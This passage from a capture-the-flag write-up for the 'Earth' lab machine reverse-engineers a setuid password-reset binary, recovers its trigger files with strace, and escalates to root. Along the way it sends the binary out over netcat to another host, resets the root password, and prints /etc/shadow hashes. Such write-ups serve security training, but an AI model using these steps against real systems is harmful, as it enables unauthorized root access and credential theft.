+<span id="cb47-47"><a href="#cb47-47" aria-hidden="true"></a>  local_10c5 = <span class="bn">0x20061e4312081c5b</span>;</span>
+<span id="cb47-48"><a href="#cb47-48" aria-hidden="true"></a>  local_10bd = <span class="bn">0x1b072551</span>;</span>
+<span id="cb47-49"><a href="#cb47-49" aria-hidden="true"></a>  local_10b9 = <span class="dv">0</span>;</span>
+<span id="cb47-50"><a href="#cb47-50" aria-hidden="true"></a>  magic_cipher(&amp;local_38,&amp;local_18,local_58,<span class="bn">0x11</span>,<span class="bn">0xc</span>);</span>
+<span id="cb47-51"><a href="#cb47-51" aria-hidden="true"></a>  local_47 = <span class="dv">0</span>;</span>
+<span id="cb47-52"><a href="#cb47-52" aria-hidden="true"></a>  puts(<span class="st">&quot;CHECKING IF RESET TRIGGERS PRESENT...&quot;</span>);</span>
+<span id="cb47-53"><a href="#cb47-53" aria-hidden="true"></a>  magic_cipher(&amp;local_1098,local_58,local_1078,<span class="bn">0x11</span>,<span class="bn">0x12</span>);</span>
+<span id="cb47-54"><a href="#cb47-54" aria-hidden="true"></a>  local_1067 = <span class="dv">0</span>;</span>
+<span id="cb47-55"><a href="#cb47-55" aria-hidden="true"></a>  iVar1 = access(local_1078,<span class="dv">0</span>);</span>
+<span id="cb47-56"><a href="#cb47-56" aria-hidden="true"></a>  <span class="cf">if</span> (iVar1 == <span class="dv">0</span>) {</span>
+<span id="cb47-57"><a href="#cb47-57" aria-hidden="true"></a>    local_c = local_c + <span class="dv">1</span>;</span>
+<span id="cb47-58"><a href="#cb47-58" aria-hidden="true"></a>  }</span>
+<span id="cb47-59"><a href="#cb47-59" aria-hidden="true"></a>  magic_cipher(&amp;local_10b8,local_58,local_1078,<span class="bn">0x11</span>,<span class="bn">0x12</span>);</span>
+<span id="cb47-60"><a href="#cb47-60" aria-hidden="true"></a>  local_1067 = <span class="dv">0</span>;</span>
+<span id="cb47-61"><a href="#cb47-61" aria-hidden="true"></a>  iVar1 = access(local_1078,<span class="dv">0</span>);</span>
+<span id="cb47-62"><a href="#cb47-62" aria-hidden="true"></a>  <span class="cf">if</span> (iVar1 == <span class="dv">0</span>) {</span>
+<span id="cb47-63"><a href="#cb47-63" aria-hidden="true"></a>    local_c = local_c + <span class="dv">1</span>;</span>
+<span id="cb47-64"><a href="#cb47-64" aria-hidden="true"></a>  }</span>
+<span id="cb47-65"><a href="#cb47-65" aria-hidden="true"></a>  magic_cipher(&amp;local_10c5,local_58,local_1078,<span class="bn">0xd</span>,<span class="bn">0x12</span>);</span>
+<span id="cb47-66"><a href="#cb47-66" aria-hidden="true"></a>  local_106b = <span class="dv">0</span>;</span>
+<span id="cb47-67"><a href="#cb47-67" aria-hidden="true"></a>  iVar1 = access(local_1078,<span class="dv">0</span>);</span>
+<span id="cb47-68"><a href="#cb47-68" aria-hidden="true"></a>  <span class="cf">if</span> (iVar1 == <span class="dv">0</span>) {</span>
+<span id="cb47-69"><a href="#cb47-69" aria-hidden="true"></a>    local_c = local_c + <span class="dv">1</span>;</span>
+<span id="cb47-70"><a href="#cb47-70" aria-hidden="true"></a>  }</span>
+<span id="cb47-71"><a href="#cb47-71" aria-hidden="true"></a>  <span class="cf">if</span> (local_c == <span class="dv">3</span>) {</span>
+<span id="cb47-72"><a href="#cb47-72" aria-hidden="true"></a>    puts(<span class="st">&quot;RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth&quot;</span>);</span>
+<span id="cb47-73"><a href="#cb47-73" aria-hidden="true"></a>    setuid(<span class="dv">0</span>);</span>
+<span id="cb47-74"><a href="#cb47-74" aria-hidden="true"></a>    system(<span class="st">&quot;/usr/bin/echo </span><span class="sc">\&#39;</span><span class="st">root:Earth</span><span class="sc">\&#39;</span><span class="st"> | /usr/sbin/chpasswd&quot;</span>);</span>
+<span id="cb47-75"><a href="#cb47-75" aria-hidden="true"></a>  }</span>
+<span id="cb47-76"><a href="#cb47-76" aria-hidden="true"></a>  <span class="cf">else</span> {</span>
+<span id="cb47-77"><a href="#cb47-77" aria-hidden="true"></a>    puts(<span class="st">&quot;RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.&quot;</span>);</span>
+<span id="cb47-78"><a href="#cb47-78" aria-hidden="true"></a>  }</span>
+<span id="cb47-79"><a href="#cb47-79" aria-hidden="true"></a>  <span class="cf">return</span> <span class="dv">0</span>;</span>
+<span id="cb47-80"><a href="#cb47-80" aria-hidden="true"></a>}</span>
+<span id="cb47-81"><a href="#cb47-81" aria-hidden="true"></a></span>
+<span id="cb47-82"><a href="#cb47-82" aria-hidden="true"></a><span class="dt">void</span> magic_cipher(<span class="dt">long</span> param_1,<span class="dt">long</span> param_2,<span class="dt">long</span> param_3,<span class="dt">int</span> param_4,<span class="dt">int</span> param_5)</span>
+<span id="cb47-83"><a href="#cb47-83" aria-hidden="true"></a></span>
+<span id="cb47-84"><a href="#cb47-84" aria-hidden="true"></a>{</span>
+<span id="cb47-85"><a href="#cb47-85" aria-hidden="true"></a>  <span class="dt">int</span> local_c;</span>
+<span id="cb47-86"><a href="#cb47-86" aria-hidden="true"></a>  </span>
+<span id="cb47-87"><a href="#cb47-87" aria-hidden="true"></a>  local_c = <span class="dv">0</span>;</span>
+<span id="cb47-88"><a href="#cb47-88" aria-hidden="true"></a>  <span class="cf">while</span> (local_c &lt; param_4) {</span>
+<span id="cb47-89"><a href="#cb47-89" aria-hidden="true"></a>    *(byte *)(param_3 + local_c) =</span>
+<span id="cb47-90"><a href="#cb47-90" aria-hidden="true"></a>         *(byte *)(param_2 + local_c % (param_5 + -<span class="dv">1</span>)) ^ *(byte *)(param_1 + local_c);</span>
+<span id="cb47-91"><a href="#cb47-91" aria-hidden="true"></a>    local_c = local_c + <span class="dv">1</span>;</span>
+<span id="cb47-92"><a href="#cb47-92" aria-hidden="true"></a>  }</span>
+<span id="cb47-93"><a href="#cb47-93" aria-hidden="true"></a>  <span class="cf">return</span>;</span>
+<span id="cb47-94"><a href="#cb47-94" aria-hidden="true"></a>}</span></code></pre></div>
+<div class="sourceCode" id="cb48"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true"></a><span class="kw">function</span> <span class="fu">magic_cipher</span>(param_1<span class="op">,</span> param_2<span class="op">,</span> param_3<span class="op">,</span> param_4<span class="op">,</span> param_5) {</span>
+<span id="cb48-2"><a href="#cb48-2" aria-hidden="true"></a>    <span class="kw">var</span> local_c <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb48-3"><a href="#cb48-3" aria-hidden="true"></a>    <span class="cf">while</span>(local_c <span class="op">&lt;</span> param_4) {</span>
+<span id="cb48-4"><a href="#cb48-4" aria-hidden="true"></a>        param_3[local_c] <span class="op">=</span> (param_2 <span class="op">+</span> local_c <span class="op">%</span> (param_5 <span class="op">+</span> <span class="dv">-1</span>)) <span class="op">^</span> (param_1 <span class="op">+</span> local_c)</span>
+<span id="cb48-5"><a href="#cb48-5" aria-hidden="true"></a>        local_c <span class="op">+=</span> <span class="dv">1</span></span>
+<span id="cb48-6"><a href="#cb48-6" aria-hidden="true"></a>    }</span>
+<span id="cb48-7"><a href="#cb48-7" aria-hidden="true"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(local_c<span class="op">,</span> param_1<span class="op">,</span> param_2<span class="op">,</span> param_3<span class="op">,</span> param_4<span class="op">,</span> param_5)</span>
+<span id="cb48-8"><a href="#cb48-8" aria-hidden="true"></a>}</span></code></pre></div>
+<p>I think that the values shown below are actually address. Also, this looks like XOR encryption.</p>
+<pre><code>  local_18 = 0x65756c62656c6170;
+  local_10 = 0x746f64;
+  local_38 = 0x810190e07090904;
+  local_30 = 0x555c5d041c161d05;
+  local_28 = 0x5e;
+  local_78 = 0x69746e6564657263;
+  local_70 = 0x746f6f7220736c61;
+  local_68 = 0x747261456568743a;
+  local_60 = 0x74616c66736968;
+  local_c = 0;
+  local_1098 = 0xd064314000c5b;
+  local_1090 = 0x27077310b2a194e;
+  local_1088 = 0x75;
+  local_10b8 = 0xd064314000c5b;
+  local_10b0 = 0x620067075b15284e;
+  local_10a8 = 7;
+  local_10c5 = 0x20061e4312081c5b;
+  local_10bd = 0x1b072551;
+  local_10b9 = 0;
+  magic_cipher(&amp;local_38,&amp;local_18,local_58,0x11,0xc);
+  local_47 = 0;</code></pre>
+<p>But then, if you read code, there are these <code>access</code> calls, so variables <code>local_1078</code> must be file names.</p>
+<blockquote>
+    <p>Running <code>strace ./reset_root</code></p>
+</blockquote>
+<pre class="shell"><code>chmod +x ./reset_root
+
+strace ./reset_root
+execve(&quot;./reset_root&quot;, [&quot;./reset_root&quot;], 0x7ffe424c3270 /* 67 vars */) = 0
+brk(NULL)                               = 0xad8000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=197558, ...}) = 0
+mmap(NULL, 197558, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f95c0008000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\200\177\2\0\0\0\0\0&quot;..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=1839168, ...}) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f95c0006000
+mmap(NULL, 1852480, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f95bfe41000
+mprotect(0x7f95bfe67000, 1658880, PROT_NONE) = 0
+mmap(0x7f95bfe67000, 1347584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f95bfe67000
+mmap(0x7f95bffb0000, 307200, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16f000) = 0x7f95bffb0000
+mmap(0x7f95bfffc000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7f95bfffc000
+mmap(0x7f95c0002000, 13376, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f95c0002000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f95bfe3f000
+arch_prctl(ARCH_SET_FS, 0x7f95c0007540) = 0
+mprotect(0x7f95bfffc000, 12288, PROT_READ) = 0
+mprotect(0x403000, 4096, PROT_READ)     = 0
+mprotect(0x7f95c0063000, 4096, PROT_READ) = 0
+munmap(0x7f95c0008000, 197558)          = 0
+fstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0x2), ...}) = 0
+brk(NULL)                               = 0xad8000
+brk(0xaf9000)                           = 0xaf9000
+write(1, &quot;CHECKING IF RESET TRIGGERS PRESE&quot;..., 38CHECKING IF RESET TRIGGERS PRESENT...
+) = 38
+access(&quot;/dev/shm/kHgTFI5G&quot;, F_OK)       = -1 ENOENT (No such file or directory)
+access(&quot;/dev/shm/Zw7bV9U5&quot;, F_OK)       = -1 ENOENT (No such file or directory)
+access(&quot;/tmp/kcM0Wewe&quot;, F_OK)           = -1 ENOENT (No such file or directory)
+write(1, &quot;RESET FAILED, ALL TRIGGERS ARE N&quot;..., 44RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+) = 44
+exit_group(0)                           = ?
++++ exited with 0 +++</code></pre>
+<figure>
+    <img src="59.what-are-you-doing-step-executable.png" alt="" /><figcaption>59.what-are-you-doing-step-executable</figcaption>
+</figure>
+<h2 id="root">root</h2>
+<pre class="shell"><code>bash-5.1$ nc 192.168.56.40 4444 &lt; /usr/bin/reset_root
+nc 192.168.56.40 4444 &lt; /usr/bin/reset_root
+bash-5.1$ cd /tmp
+cd /tmp
+bash-5.1$ touch kcM0Wewe
+touch kcM0Wewe
+bash-5.1$ /usr/bin/reset_root
+/usr/bin/reset_root
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+bash-5.1$ touch /dev/shm/kHgTFI5G
+touch /dev/shm/kHgTFI5G
+bash-5.1$ touch /dev/shm/Zw7bV9U5
+touch /dev/shm/Zw7bV9U5
+bash-5.1$ /usr/bin/reset_root
+/usr/bin/reset_root
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+bash-5.1$ su root
+su root
+Password: Earth
+
+[root@earth tmp]# whoami
+whoami
+root
+[root@earth tmp]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+[root@earth tmp]# hostname
+hostname
+earth
+[root@earth tmp]# date
+date
+Mon Dec  6 07:26:10 UTC 2021
+[root@earth tmp]# cat /etc/shadow
+cat /etc/shadow
+root:$6$lQW/c/C2KSl$UxMmkuy6dSjhZHcUzLDZr/lp1ppvT5.MeFlshgcCqdIE7E/hcif9fBRe1Uxn.PSM7poXYCza77t5O7SHO/VsV1:18967:0:99999:7:::
+bin:*:18656:0:99999:7:::
+daemon:*:18656:0:99999:7:::
+adm:*:18656:0:99999:7:::
+lp:*:18656:0:99999:7:::
+sync:*:18656:0:99999:7:::
+shutdown:*:18656:0:99999:7:::
+halt:*:18656:0:99999:7:::
+mail:*:18656:0:99999:7:::
+operator:*:18656:0:99999:7:::
+games:*:18656:0:99999:7:::
+ftp:*:18656:0:99999:7:::
+nobody:*:18656:0:99999:7:::
+systemd-coredump:!!:18911::::::
+systemd-resolve:!!:18911::::::
+systemd-oom:!!:18911::::::
+systemd-timesync:!!:18911::::::
+dbus:!!:18911::::::
+polkitd:!!:18911::::::
+rpc:!!:18911:0:99999:7:::
+cockpit-ws:!!:18911::::::
+cockpit-wsinstance:!!:18911::::::
+tss:!!:18911::::::
+abrt:!!:18911::::::
+setroubleshoot:!!:18911::::::
+rpcuser:!!:18911::::::
+sshd:!!:18911::::::
+dnsmasq:!!:18911::::::
+chrony:!!:18911::::::
+tcpdump:!!:18911::::::
+systemd-network:!*:18911::::::
+unbound:!!:18911::::::
+clevis:!!:18911::::::
+earth:$6$FIzdW32ORg9hSBef$OUYFnDfydL/jy4C8GaAP3LWTCiuDpZ4SgC83/RYYVq7YJVvgks.kVOBfUL0J7Vw.AOx3oujXcjGDFHvohL0dj1:18913:0:99999:7:::
+apache:!!:18911::::::
+</code></pre>
+<figure>
+    <img src="60.Rooted.png" alt="" /><figcaption>60.Rooted</figcaption>
+</figure>
+<blockquote>
+    <p>flag /root/root_flag.txt</p>
+</blockquote>
+<pre class="shell"><code>[root@earth ~]# cat /root/root_flag.txt
+cat /root/root_flag.txt
+
+              _-o#&amp;&amp;*&#39;&#39;&#39;&#39;?d:&gt;b\_
+          _o/&quot;`&#39;&#39;  &#39;&#39;,, dMF9MMMMMHo_
+       .o&amp;#&#39;        `&quot;MbHMMMMMMMMMMMHo.
+     .o&quot;&quot; &#39;         vodM*$&amp;&amp;HMMMMMMMMMM?.
+    ,&#39;              $M&amp;ood,~&#39;`(&amp;##MMMMMMH\
+   /               ,MMMMMMM#b?#bobMMMMHMMML
+  &amp;              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
+ ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
+|               |MMMMMMMMMMMMMMMMMMMMbMH&#39;   T,
+$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}&#39;  `?
+]MMH#             &quot;&quot;*&quot;&quot;&quot;&quot;*#MMMMMMMMMMMMM&#39;    -
+MMMMMb_                   |MMMMMMMMMMMP&#39;     :
+HMMMMMMMHo                 `MMMMMMMMMT       .
+?MMMMMMMMP                  9MMMMMMMM}       -
+-?MMMMMMM                  |MMMMMMMMM?,d-    &#39;
+ :|MMMMMM-                 `MMMMMMMT .M|.   :
+  .9MMM[                    &amp;MMMMM*&#39; `&#39;    .
+   :9MMk                    `MMM#&quot;        -
+     &amp;M}                     `          .-
+      `&amp;.                             .
+        `~,   .                     ./
+            . _                  .-
+              &#39;`--._,dd###pp=&quot;&quot;&#39;
+
+Congratulations on completing Earth!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_b0da9554d29db2117b02aa8b66ec492e]</code></pre>
+<figure>
+    <img src="61.root-flag.png" alt="" /><figcaption>61.root-flag</figcaption>
+</figure>
+<p>Rooted! I started it at 0519 and now it is 1300. So, only took me almost 8 hours. And still need some time for publishing it.</p>
